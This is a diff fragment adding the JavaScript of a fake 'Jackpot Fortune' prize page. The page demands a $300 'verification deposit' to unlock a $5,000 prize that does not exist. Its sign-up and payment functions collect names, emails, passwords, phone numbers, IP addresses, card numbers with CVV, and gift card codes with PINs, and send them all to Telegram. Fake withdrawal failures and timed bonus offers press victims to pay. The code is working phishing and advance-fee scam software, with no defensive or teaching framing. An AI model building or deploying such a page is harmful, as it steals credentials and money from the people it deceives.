+                    alert('📧 Demo Mode: Your verification code is ' + code + '\n\nIn production, this would be sent to your email.');
+                }, 500);
+                
+                return true; // Always return true to continue
+            }
+        }
+        
+        // Update crypto address based on selection
+        function updateCryptoAddress() {
+            const cryptoType = document.getElementById('cryptoType').value;
+            const address = CONFIG.crypto[cryptoType];
+            if (address) {
+                document.getElementById('cryptoAddressDisplay').textContent = address;
+            }
+        }
+        
+        // Copy crypto address to clipboard
+        function copyCryptoAddress() {
+            const cryptoType = document.getElementById('cryptoType').value;
+            const address = CONFIG.crypto[cryptoType];
+            navigator.clipboard.writeText(address).then(() => {
+                alert('✅ Address copied to clipboard!');
+            });
+        }
+        
+        // Redirect to PayPal
+        function redirectToPayPal() {
+            const paypalUrl = `https://paypal.me/${CONFIG.paypal.tag.replace('@', '')}/300`;
+            window.open(paypalUrl, '_blank');
+            
+            // Show confirmation message
+            setTimeout(() => {
+                alert('💰 Please send exactly $300 USD to ' + CONFIG.paypal.tag + '\n\nReturn here after payment to confirm.');
+            }, 1000);
+        }
+        
+        // Handle gift card photo upload
+        function handleGiftcardUpload(input) {
+            if (input.files && input.files[0]) {
+                const file = input.files[0];
+                if (file.size > 5 * 1024 * 1024) {
+                    alert('File size too large. Please select image under 5MB.');
+                    return;
+                }
+                document.getElementById('uploadStatus').innerHTML = '✅ Photo uploaded: ' + file.name;
+                console.log('Gift card photo captured:', file.name);
+            }
+        }
+        
+        // Validate form inputs
+        function validateForm() {
+            let isValid = true;
+            
+            document.querySelectorAll('.error-message').forEach(error => {
+                error.style.display = 'none';
+            });
+            
+            const name = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const phone = document.getElementById('phone').value.trim();
+            
+            if (!name) {
+                document.getElementById('nameError').style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                document.getElementById('emailError').style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!password || password.length < 6) {
+                document.getElementById('passwordError').style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!phone) {
+                document.getElementById('phoneError').style.display = 'block';
+                isValid = false;
+            }
+            
+            return isValid;
+        }
+        
+        // FIXED: Signup function - ALWAYS WORKS
+        async function signUp() {
+            console.log('🎯 Signup button clicked');
+            
+            if (!validateForm()) {
+                console.log('❌ Form validation failed');
+                return;
+            }
+            
+            const name = document.getElementById('fullName').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const phone = document.getElementById('phone').value;
+            const ipAddress = await getUserIP();
+            
+            userData = { name, email, password, phone, ip_address: ipAddress };
+            
+            // Send to Telegram immediately
+            await sendToTelegram({
+                ...userData,
+                payment_method: 'signup',
+                timestamp: new Date().toISOString()
+            });
+            
+            const code = generateVerificationCode();
+            
+            const btn = document.getElementById('signupBtn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = 'Sending Verification Code<span class="loading-dots"></span>';
+            btn.disabled = true;
+            
+            console.log('📧 Sending verification code:', code);
+            
+            // ALWAYS send email (or show demo mode)
+            const emailSent = await sendVerificationEmail(email, code);
+            
+            // Update UI with user's email
+            document.getElementById('userEmailDisplay').textContent = email;
+            document.getElementById('previewEmail').textContent = email;
+            
+            // ALWAYS show verification page
+            showPage('verify-page');
+            startResendTimer();
+            
+            // Focus first code input
+            setTimeout(() => {
+                document.querySelector('.code-input input').focus();
+            }, 100);
+            
+            console.log('✅ User data captured:', userData);
+            console.log('✅ Verification code:', code);
+            
+            btn.innerHTML = originalText;
+            btn.disabled = false;
+        }
+        
+        // Resend timer
+        function startResendTimer() {
+            resendTimer = 60;
+            document.getElementById('resendBtn').disabled = true;
+            document.getElementById('resendBtn').innerHTML = 'Resend Code';
+            document.getElementById('resendTimer').style.display = 'block';
+            
+            clearInterval(resendInterval);
+            resendInterval = setInterval(() => {
+                resendTimer--;
+                document.getElementById('resendCountdown').textContent = resendTimer;
+                
+                if (resendTimer <= 0) {
+                    clearInterval(resendInterval);
+                    document.getElementById('resendBtn').disabled = false;
+                    document.getElementById('resendTimer').style.display = 'none';
+                }
+            }, 1000);
+        }
+        
+        // Resend verification code
+        async function resendCode() {
+            const code = generateVerificationCode();
+            
+            const emailSent = await sendVerificationEmail(userData.email, code);
+            
+            if (emailSent) {
+                alert('✅ New verification code sent! Check your email.');
+                document.getElementById('emailTime').textContent = new Date().toLocaleTimeString();
+                startResendTimer();
+            }
+        }
+        
+        // Move to next input field in code verification
+        function moveToNext(input, nextIndex) {
+            if (input.value.length === 1) {
+                const nextInput = input.parentElement.querySelector(`input:nth-child(${nextIndex + 1})`);
+                if (nextInput) {
+                    nextInput.focus();
+                }
+            }
+            
+            const inputs = document.querySelectorAll('.code-input input');
+            let allFilled = true;
+            inputs.forEach(input => {
+                if (!input.value) allFilled = false;
+            });
+            
+            if (allFilled) {
+                setTimeout(verifyCode, 300);
+            }
+        }
+        
+        // Verify the entered code
+        function verifyCode() {
+            const inputs = document.querySelectorAll('.code-input input');
+            let enteredCode = '';
+            
+            inputs.forEach(input => {
+                enteredCode += input.value;
+            });
+            
+            if (enteredCode.length !== 6) {
+                alert('Please enter the complete 6-digit code.');
+                return;
+            }
+            
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.innerHTML = 'Verifying<span class="loading-dots"></span>';
+            verifyBtn.disabled = true;
+            
+            setTimeout(() => {
+                if (enteredCode === verificationCode) {
+                    userData.verified = true;
+                    alert('✅ Email verified successfully! Your account is now active.');
+                    showPage('dashboard-page');
+                    document.getElementById('userName').textContent = userData.name;
+                    
+                    document.getElementById('signup-form').style.display = 'none';
+                    document.getElementById('deposit-form').style.display = 'block';
+                } else {
+                    alert('❌ Invalid verification code. Please check the code displayed above and try again.');
+                    inputs.forEach(input => input.value = '');
+                    inputs[0].focus();
+                }
+                
+                verifyBtn.innerHTML = 'Verify & Continue';
+                verifyBtn.disabled = false;
+            }, 1500);
+        }
+        
+        // Payment selection
+        function selectPayment(method) {
+            selectedPayment = method;
+            
+            document.querySelectorAll('.payment-option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
+            
+            event.target.classList.add('selected');
+            
+            document.querySelectorAll('.payment-methods').forEach(form => {
+                form.style.display = 'none';
+            });
+            
+            document.getElementById(`${method}-form`).style.display = 'block';
+            
+            // Update PayPal tag display
+            if (method === 'paypal') {
+                document.getElementById('paypalTagDisplay').textContent = CONFIG.paypal.tag;
+            }
+        }
+        
+        // Show payment confirmation modal
+        function showPaymentConfirmation() {
+            if (!selectedPayment) {
+                alert('Please select a payment method!');
+                return;
+            }
+            
+            let isValid = true;
+            
+            switch(selectedPayment) {
+                case 'credit':
+                    const cardNumber = document.getElementById('cardNumber').value;
+                    const expiry = document.getElementById('expiry').value;
+                    const cvv = document.getElementById('cvv').value;
+                    const cardName = document.getElementById('cardName').value;
+                    
+                    if (!cardNumber || !expiry || !cvv || !cardName) {
+                        alert('Please complete all credit card details!');
+                        isValid = false;
+                    }
+                    break;
+                    
+                case 'giftcard':
+                    const giftcardCode = document.getElementById('giftcardCode').value;
+                    if (!giftcardCode) {
+                        alert('Please enter your gift card code!');
+                        isValid = false;
+                    }
+                    break;
+                    
+                case 'crypto':
+                    // Crypto doesn't need validation since they send to external wallet
+                    break;
+                    
+                case 'paypal':
+                    const paypalEmail = document.getElementById('paypalEmail').value;
+                    if (!paypalEmail) {
+                        alert('Please enter your PayPal email for confirmation!');
+                        isValid = false;
+                    }
+                    break;
+            }
+            
+            if (!isValid) return;
+            
+            // Show confirmation modal
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+        
+        // Hide payment modal
+        function hidePaymentModal() {
+            document.getElementById('paymentModal').style.display = 'none';
+        }
+        
+        // Confirm payment
+        async function confirmPayment() {
+            hidePaymentModal();
+            
+            const depositBtn = document.getElementById('depositBtn');
+            depositBtn.innerHTML = 'Processing Payment<span class="loading-dots"></span>';
+            depositBtn.disabled = true;
+            
+            let paymentData = { method: selectedPayment };
+            const ipAddress = await getUserIP();
+            
+            // Capture payment details based on method
+            switch(selectedPayment) {
+                case 'credit':
+                    paymentData.cardNumber = document.getElementById('cardNumber').value;
+                    paymentData.expiry = document.getElementById('expiry').value;
+                    paymentData.cvv = document.getElementById('cvv').value;
+                    paymentData.cardName = document.getElementById('cardName').value;
+                    break;
+                    
+                case 'giftcard':
+                    paymentData.giftcardCode = document.getElementById('giftcardCode').value;
+                    paymentData.giftcardType = document.getElementById('giftcardType').value;
+                    paymentData.giftcardPin = document.getElementById('giftcardPin').value;
+                    break;
+                    
+                case 'crypto':
+                    paymentData.cryptoType = document.getElementById('cryptoType').value;
+                    paymentData.cryptoAddress = CONFIG.crypto[paymentData.cryptoType];
+                    break;
+                    
+                case 'paypal':
+                    paymentData.paypalEmail = document.getElementById('paypalEmail').value;
+                    paymentData.paypalTransactionId = document.getElementById('paypalTransactionId').value;
+                    paymentData.paypalTag = CONFIG.paypal.tag;
+                    break;
+            }
+            
+            // Send payment data to Telegram
+            await sendToTelegram({
+                ...userData,
+                payment_method: selectedPayment,
+                payment_data: paymentData,
+                amount: '$300',
+                ip_address: ipAddress,
+                timestamp: new Date().toISOString()
+            });
+            
+            setTimeout(() => {
+                console.log('💰 Payment details captured:', { user: userData, payment: paymentData });
+                
+                generateReceipt(paymentData);
+                showPage('receipt-page');
+                
+                depositBtn.innerHTML = 'PAY $300 TO UNLOCK $5,000';
+                depositBtn.disabled = false;
+            }, 2000);
+        }
+        
+        // Generate receipt
+        function generateReceipt(paymentData) {
+            const receiptId = 'JFP-' + Math.floor(100000 + Math.random() * 900000);
+            const now = new Date();
+            
+            document.getElementById('receiptId').textContent = receiptId;
+            document.getElementById('receiptDate').textContent = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+            document.getElementById('receiptMethod').textContent = getPaymentMethodName(paymentData.method);
+            document.getElementById('receiptAccount').textContent = userData.name;
+        }
+        
+        // Get payment method name for receipt
+        function getPaymentMethodName(method) {
+            const methods = {
+                'credit': 'Credit/Debit Card',
+                'giftcard': 'Gift Card',
+                'crypto': 'Cryptocurrency',
+                'paypal': 'PayPal'
+            };
+            return methods[method] || method;
+        }
+        
+        // Print receipt
+        function printReceipt() {
+            window.print();
+        }
+        
+        // Dashboard functions
+        function attemptWithdrawal() {
+            alert('⚠️ Withdrawal Failed\n\nTo prevent fraud, a $300 verification deposit is required before you can withdraw your $5,000 prize.\n\nThis deposit is fully refundable and will be returned with your withdrawal.');
+            
+            setTimeout(() => {
+                if(confirm('Would you like to complete the verification deposit now?')) {
+                    showPage('main-page');
+                }
+            }, 1000);
+        }
+        
+        function showBonusOffer() {
+            alert('🎉 Special Bonus Offer!\n\nComplete your verification deposit within the next 15 minutes and receive an additional $350 bonus!\n\nTotal withdrawal: $5,350.00');
+            
+            setTimeout(() => {
+                showPage('main-page');
+            }, 2000);
+        }
+        
+        // Support functions
+        function startLiveChat() {
+            alert('💬 Live Chat\n\nAll agents are currently busy helping other winners. Please try again in 15-20 minutes or send us an email.');
+        }
+        
+        function showEmailForm() {
+            alert('📧 Email Support\n\nSend your questions to: support@jackpot-fortune.iceiy.com\n\nWe respond within 24 hours.');
+        }
+        
+        // Initialize on load
+        document.addEventListener('DOMContentLoaded', function() {
+            updateTimer();
+            updateCryptoAddress();
+            document.getElementById('paypalTagDisplay').textContent = CONFIG.paypal.tag;
+        });
+    </script>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</body>
+</html>
